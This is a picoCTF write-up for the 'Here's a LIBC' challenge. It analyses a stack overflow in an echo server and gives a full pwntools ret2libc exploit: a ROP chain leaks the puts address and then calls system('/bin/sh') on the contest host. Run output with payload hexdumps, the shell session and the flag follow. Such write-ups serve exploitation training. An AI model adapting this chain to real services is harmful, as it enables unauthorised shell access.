# Here's a LIBC
Category: Binary Exploitation, 90 points

## Description
> I am once again asking for you to pwn this binary

A binary file, a makefile and a LIBC were attached.

```makefile
all:
	gcc -Xlinker -rpath=./ -m64 -fno-stack-protector -no-pie -o vuln vuln.c

clean:
	rm vuln
```

## Solution

Let's run the attached file:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Heres_a_LIBC]
└─$ ./vuln
WeLcOmE To mY EcHo sErVeR!
test
TeSt
```

Looks like an echo server that changes the case of the input.

Let's check the decompiled output:

```c
void main(undefined4 param_1,undefined8 param_2)

{
  uint converted_char;
  char acStack168 [24];
  undefined8 uStack144;
  undefined8 local_88;
  undefined4 local_7c;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined2 local_60;
  undefined local_5e;
  char *output;
  undefined8 local_48;
  ulong limit;
  __gid_t local_34;
  ulong i;
  
  uStack144 = 0x40079c;
  local_88 = param_2;
  local_7c = param_1;
  setbuf(stdout,(char *)0x0);
  uStack144 = 0x4007a1;
  local_34 = getegid();
  uStack144 = 0x4007bb;
  setresgid(local_34,local_34,local_34);
  limit = 27;
  local_78 = 0x20656d6f636c6557;
  local_70 = 0x636520796d206f74;
  local_68 = 0x6576726573206f68;
  local_60 = 0x2172;
  local_5e = 0;
  local_48 = 0x1a;
  output = acStack168;
  i = 0;
  while (i < limit) {
    converted_char = convert_case(*(byte *)((long)&local_78 + i),i);
    output[i] = (char)converted_char;
    i = i + 1;
  }
  puts(output);
  do {
    do_stuff();
  } while( true );
}
```

The program prints the greeting (after converting its case) and then enters an infinite loop of `do_stuff`:

```c
void do_stuff(void)

{
  uint converted_char;
  undefined line_feed;
  byte user_input [112];
  undefined8 local_18;
  ulong i;
  
  local_18 = 0;
  __isoc99_scanf("%[^\n]",user_input);
  __isoc99_scanf(&DAT_0040093a,&line_feed);
  i = 0;
  while (i < 100) {
    converted_char = convert_case(user_input[i],i);
    user_input[i] = (byte)converted_char;
    i = i + 1;
  }
  puts((char *)user_input);
  return;
}
```

The program uses `scanf` to read an unlimited amount of characters from the user into a buffer of length `112`, then converts the case of the first `100` characters. This allows us to conveniently overflow the `user_input` buffer and perform a ROP attack.

Using our ROP chain, we will:

1. Leak the runtime address of `puts`
2. Calculate the base runtime address of LIBC using the runtime address of `puts`
3. Call `do_stuff` again and provide it with another ROP chain, which will essentially call `system("/bin/sh")`

Script:
```python
# First, generate template using:
# pwn template --host mercury.picoctf.net --port 24159 ./vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("./provided_libc.so.6")

banner = "WeLcOmE To mY EcHo sErVeR!\n"

io = start()


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    #os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(150, n = exe.bytes)
    proc.sendlineafter(banner, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset


overflow_offset = get_overflow_offset()

log.info("puts() address in GOT: {}".format(hex(exe.got['puts'])))

rop = ROP(exe)
rop.call('puts', [exe.got['puts']]) # Leak address of puts() via puts()
rop.do_stuff()

log.info("First ROP Chain:\n{}".format(rop.dump()))

payload = fit({
     overflow_offset: bytes(rop)
})

log.info("Sending payload:\n{}".format(hexdump(payload)))

io.sendlineafter(banner, payload)
io.recvline()

puts_addr = int.from_bytes(io.recvline(keepends = False), byteorder = "little")
log.info("puts() runtime address: {}".format(hex(puts_addr)))

libc_base = puts_addr - libc.symbols["puts"]
assert(libc_base & 0xFFF == 0)
log.info("LibC runtime base address: {}".format(hex(libc_base)))

libc.address = libc_base

rop = ROP(exe)
rop.call('puts', [exe.got['puts']]) # dummy call, align stack for XMM
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh"))])
log.info("Second ROP Chain:\n{}".format(rop.dump()))

payload = fit({
     overflow_offset: bytes(rop)
})

log.info("Sending payload:\n{}".format(hexdump(payload)))

io.sendline(payload)
io.recvline()
io.recvline()

io.interactive()


```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/Heres_a_LIBC]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/pico/Heres_a_LIBC/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
[*] '/media/sf_CTFs/pico/Heres_a_LIBC/provided_libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mercury.picoctf.net on port 24159: Done
[+] Starting local process '/media/sf_CTFs/pico/Heres_a_LIBC/vuln': pid 6054
[*] Process '/media/sf_CTFs/pico/Heres_a_LIBC/vuln' stopped with exit code -11 (SIGSEGV) (pid 6054)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/Heres_a_LIBC/core.6054'
    Arch:      amd64-64-little
    RIP:       0x400770
    RSP:       0x7ffd5d757638
    Exe:       '/media/sf_CTFs/pico/Heres_a_LIBC/vuln' (0x400000)
    Fault:     0x6161616161616172
[*] Overflow offset: 136
[*] puts() address in GOT: 0x601018
[*] Loaded 14 cached gadgets for './vuln'
[*] First ROP Chain:
    0x0000:         0x400913 pop rdi; ret
    0x0008:         0x601018 [arg0] rdi = got.puts
    0x0010:         0x400540 puts
    0x0018:         0x4006d8 do_stuff()
[*] Sending payload:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  13 09 40 00  00 00 00 00  │haab│iaab│··@·│····│
    00000090  18 10 60 00  00 00 00 00  40 05 40 00  00 00 00 00  │··`·│····│@·@·│····│
    000000a0  d8 06 40 00  00 00 00 00                            │··@·│····│
    000000a8
[*] puts() runtime address: 0x7ff422724a30
[*] LibC runtime base address: 0x7ff4226a4000
[*] Second ROP Chain:
    0x0000:         0x400913 pop rdi; ret
    0x0008:         0x601018 [arg0] rdi = got.puts
    0x0010:         0x400540 puts
    0x0018:         0x400913 pop rdi; ret
    0x0020:   0x7ff4228580fa [arg0] rdi = 140686527922426
    0x0028:   0x7ff4226f34e0
[*] Sending payload:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  13 09 40 00  00 00 00 00  │haab│iaab│··@·│····│
    00000090  18 10 60 00  00 00 00 00  40 05 40 00  00 00 00 00  │··`·│····│@·@·│····│
    000000a0  13 09 40 00  00 00 00 00  fa 80 85 22  f4 7f 00 00  │··@·│····│···"│····│
    000000b0  e0 34 6f 22  f4 7f 00 00                            │·4o"│····│
    000000b8
[*] Switching to interactive mode
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_cf205091ad15ab6d}
```